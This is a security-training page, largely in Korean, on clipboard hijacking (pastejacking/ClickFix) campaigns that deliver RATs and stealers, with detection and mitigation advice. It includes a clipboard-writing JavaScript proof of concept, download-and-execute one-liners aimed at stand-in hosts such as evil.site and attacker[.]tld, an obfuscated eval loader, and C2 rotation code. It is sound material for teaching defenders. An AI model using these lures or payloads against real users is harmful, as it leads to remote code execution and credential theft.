# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "직접 복사하지 않은 것은 절대 붙여넣지 마라." – 오래된 말이지만 여전히 유효한 조언

## 개요

Clipboard hijacking – also known as *pastejacking* – 은 사용자가 명령을 자세히 확인하지 않고 일상적으로 복사-붙여넣기하는 사실을 악용합니다. 악성 웹 페이지(또는 Electron이나 Desktop 애플리케이션과 같이 JavaScript 실행이 가능한 어떤 컨텍스트)는 프로그램으로 공격자가 제어하는 텍스트를 시스템 클립보드에 넣습니다. 피해자는 보통 정교하게 구성된 사회공학적 지침에 따라 **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell)을 누르거나 터미널을 열어 클립보드 내용을 *붙여넣기*하여 즉시 임의의 명령을 실행하도록 유도됩니다.

Because **no file is downloaded and no attachment is opened**, 이 기법은 첨부파일, 매크로 또는 직접 명령 실행을 모니터링하는 대부분의 이메일 및 웹 콘텐츠 보안 제어를 우회합니다. 따라서 이 공격은 NetSupport RAT, Latrodectus loader 또는 Lumma Stealer와 같은 일반적인 악성코드 계열을 배포하는 피싱 캠페인에서 인기가 있습니다.

## JavaScript 개념 증명
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
이전 캠페인들은 `document.execCommand('copy')`를 사용했으며, 최근 캠페인들은 비동기 **Clipboard API** (`navigator.clipboard.writeText`)에 의존합니다.

## The ClickFix / ClearFake Flow

1. 사용자가 typosquatted 또는 탈취된 사이트(예: `docusign.sa[.]com`)를 방문합니다.
2. 주입된 **ClearFake** JavaScript는 `unsecuredCopyToClipboard()` 헬퍼를 호출하여 사용자 몰래 클립보드에 Base64-encoded PowerShell one-liner를 저장합니다.
3. HTML 지침은 피해자에게 다음과 같이 안내합니다: *“**Win + R**를 누르고 명령을 붙여넣은 다음 Enter를 눌러 문제를 해결하세요.”*
4. `powershell.exe`가 실행되어 정상 실행 파일과 악성 DLL을 포함한 아카이브를 다운로드합니다 (전형적인 DLL sideloading).
5. 로더는 추가 단계를 복호화하고 shellcode를 주입하며 persistence(예: scheduled task)를 설치합니다 — 궁극적으로 NetSupport RAT / Latrodectus / Lumma Stealer를 실행합니다.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart)가 자신의 디렉터리에서 `msvcp140.dll`을 찾습니다.
* 악성 DLL은 **GetProcAddress**로 API를 동적으로 해결하고, **curl.exe**를 통해 두 개의 바이너리(`data_3.bin`, `data_4.bin`)를 다운로드한 뒤, 롤링 XOR 키 `"https://google.com/"`로 이를 복호화하고 최종 shellcode를 인젝션한 다음 **client32.exe** (NetSupport RAT)을 `C:\ProgramData\SecurityCheck_v1\`에 압축 해제합니다。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe**로 `la.txt`를 다운로드합니다  
2. **cscript.exe**에서 JScript 다운로더를 실행합니다  
3. MSI 페이로드를 가져옴 → 서명된 애플리케이션 옆에 `libcef.dll`을 드롭 → DLL sideloading → shellcode → Latrodectus.

### MSHTA를 통한 Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** 호출은 숨겨진 PowerShell 스크립트를 실행하여 `PartyContinued.exe`를 가져오고, `Boat.pst`(CAB)를 추출하며, `extrac32`와 파일 연결을 통해 `AutoIt3.exe`를 재구성한 다음 최종적으로 `.a3x` 스크립트를 실행해 브라우저 자격 증명을 `sumeriavgv.digital`로 유출한다.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

일부 ClickFix 캠페인은 파일 다운로드를 완전히 건너뛰고, 피해자에게 WSH를 통해 JavaScript를 가져와 실행하는 one‑liner를 붙여넣도록 지시하며, 이를 영속화하고 C2를 매일 회전시킨다. 관찰된 예시 체인:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
주요 특성
- 일상적인 검사로는 발견하기 어렵도록 런타임에 뒤집혀 난독화된 URL.
- JavaScript는 Startup LNK (WScript/CScript)를 통해 자체 지속되며, 현재 날짜에 따라 C2를 선택해 빠른 도메인 회전을 가능하게 함.

날짜별로 C2s를 회전시키는 데 사용되는 최소 JS 코드 조각:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
다음 단계에서는 persistence를 확보하고 RAT(예: PureHVNC)을 불러오는 loader를 배포하는 경우가 많으며, 종종 TLS를 하드코딩된 인증서로 pinning하고 트래픽을 청크로 전송합니다.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

위협 헌팅
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- 클립보드 쓰기 이벤트가 발생한 뒤 Win+R 붙여넣기 및 즉시 `powershell.exe` 실행으로 이어지는 흐름을 상관관계 분석.

블루팀은 클립보드, 프로세스 생성 및 레지스트리 텔레메트를 결합해 pastejacking 남용을 식별할 수 있습니다:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`에는 **Win + R** 명령 이력이 남습니다 – 비정상적인 Base64 / 난독화된 항목을 찾아보세요.
* Security Event ID **4688** (Process Creation)에서 `ParentImage` == `explorer.exe` 이고 `NewProcessName`이 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } 중 하나인 경우.
* Event ID **4663**: 의심스러운 4688 이벤트 직전에 `%LocalAppData%\Microsoft\Windows\WinX\` 또는 임시 폴더에서의 파일 생성 이벤트를 확인.
* EDR clipboard sensors (if present) – `Clipboard Write` 이벤트 직후 새로운 PowerShell 프로세스가 생성되는지 상관관계 분석.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

최근 캠페인들은 대량으로 가짜 CDN/브라우저 검증 페이지("잠시만요…", IUAM-style)를 생성하여 사용자가 클립보드에서 OS별 명령을 복사해 네이티브 콘솔에 붙여넣도록 유도합니다. 이는 브라우저 샌드박스 밖으로 실행을 전환하며 Windows와 macOS 전반에서 동작합니다.

빌더가 생성한 페이지의 주요 특징
- `navigator.userAgent`를 통한 OS 감지로 페이로드를 맞춤화(Windows PowerShell/CMD vs. macOS Terminal). 지원되지 않는 OS에 대해서는 속임수를 유지하기 위한 선택적 더미/무작동 동작 제공.
- 체크박스/Copy 같은 무해한 UI 동작에서 자동으로 클립보드 복사를 수행하되, 화면에 보이는 텍스트는 클립보드 내용과 다를 수 있음.
- 모바일 차단 및 단계별 안내 팝오버: Windows → Win+R→paste→Enter; macOS → Terminal 열기→paste→Enter.
- 선택적 난독화 및 단일 파일 인젝터로 손상된 사이트의 DOM을 Tailwind 스타일의 검증 UI로 덮어쓰기(새 도메인 등록 불필요).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS 초기 실행의 지속성
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`를 사용하면 터미널이 닫힌 후에도 실행이 계속되어 가시적 흔적을 줄일 수 있습니다.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- 웹: Pages that bind Clipboard API to verification widgets; 표시된 텍스트와 클립보드 페이로드의 불일치; `navigator.userAgent` 분기; Tailwind + 의심스러운 상황에서의 single-page replace.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe`가 브라우저 상호작용 직후에 생성됨; `%TEMP%`에서 실행되는 batch/MSI installers.
- macOS endpoint: Terminal/iTerm이 브라우저 이벤트 근처에서 `bash`/`curl`/`base64 -d`와 `nohup`을 실행; 터미널 종료 후에도 살아남는 백그라운드 작업.
- RunMRU Win+R 히스토리와 클립보드 쓰기 이벤트를 이후의 콘솔 프로세스 생성과 상호 연관시켜 분석.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 완화 조치

1. 브라우저 하드닝 – clipboard write-access(`dom.events.asyncClipboard.clipboardItem` 등)를 비활성화하거나 사용자 제스처를 요구.
2. 보안 인식 교육 – 사용자에게 민감한 명령을 *직접 타이핑*하거나 먼저 텍스트 편집기에 붙여넣어 확인하도록 교육.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control로 임의의 one-liners 차단.
4. 네트워크 제어 – 알려진 pastejacking 및 malware C2 도메인으로의 아웃바운드 요청 차단.

## 관련 트릭

* **Discord Invite Hijacking**은 사용자를 악성 서버로 유인한 후 동일한 ClickFix 접근법을 자주 악용합니다:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
